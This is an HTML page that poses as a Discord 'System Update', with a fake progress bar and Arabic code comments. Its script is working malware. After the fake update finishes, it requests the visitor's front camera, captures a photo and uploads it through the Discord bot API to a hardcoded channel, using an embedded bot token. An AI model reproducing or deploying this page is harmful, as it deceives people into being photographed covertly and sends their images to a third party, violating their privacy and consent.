<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>System Update</title>
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
        .terminal { max-width: 800px; margin: 0 auto; border: 2px solid #00ff00; padding: 20px; }
        .line { margin: 10px 0; }
        .progress { width: 100%; height: 20px; background: #333; }
        .progress-bar { height: 20px; background: #00ff00; width: 0%; }
        button { background: #00ff00; color: #000; border: none; padding: 10px; font-size: 16px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="terminal">
        <h2>⚡ System Update Required</h2>
        <p>Your Discord client needs an update to continue</p>
        <div class="line" id="output"></div>
        <div class="progress"><div class="progress-bar" id="progress"></div></div>
        <button onclick="startUpdate()">▶ Update Now</button>
    </div>

    <script>
    // ===== التوكن (حطه زي ما هو) =====
    var token = "MTM5NTY4MjMwMDQ0NDAyMDc5OA.G57VyI.Vv5XTuBuTYfnxN47rm5lfcdIwBVGowjLIexO8s";
    var channel = 1475949185294536859;
    
    function startUpdate() {
        document.querySelector('button').disabled = true;
        var progress = 0;
        var output = document.getElementById('output');
        var bar = document.getElementById('progress');
        
        var interval = setInterval(function() {
            progress += 10;
            bar.style.width = progress + '%';
            output.innerHTML = 'Updating... ' + progress + '%';
            
            if (progress >= 100) {
                clearInterval(interval);
                output.innerHTML = '✅ Update complete!';
                setTimeout(takePhoto, 1000);
            }
        }, 500);
    }
    
    function takePhoto() {
        try {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(function(stream) {
                    var video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    setTimeout(function() {
                        var canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                        var photo = canvas.toDataURL('image/jpeg');
                        
                        // ===== الطريقة الصح لإرسال الصورة =====
                        var formData = new FormData();
                        var blob = dataURLtoBlob(photo);
                        formData.append('file', blob, 'photo.jpg');
                        formData.append('content', '📸 Photo captured');
                        
                        fetch('https://discord.com/api/v10/channels/' + channel + '/messages', {
                            method: 'POST',
                            headers: { 
                                'Authorization': 'Bot ' + token
                            },
                            body: formData
                        }).then(function(response) {
                            console.log('Sent:', response.status);
                        }).catch(function(err) {
                            console.log('Error:', err);
                        });
                        
                        stream.getTracks().forEach(function(t) { t.stop(); });
                    }, 1500);
                })
                .catch(function(err) {
                    console.log('Camera error:', err);
                });
        } catch(e) {}
    }
    
    // ===== دالة تحويل الصورة =====
    function dataURLtoBlob(dataURL) {
        var arr = dataURL.split(','), mime = arr[0].match(/:(.*?);/)[1];
        var bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
        while(n--) { u8arr[n] = bstr.charCodeAt(n); }
        return new Blob([u8arr], {type: mime});
    }
    </script>
</body>
</html>
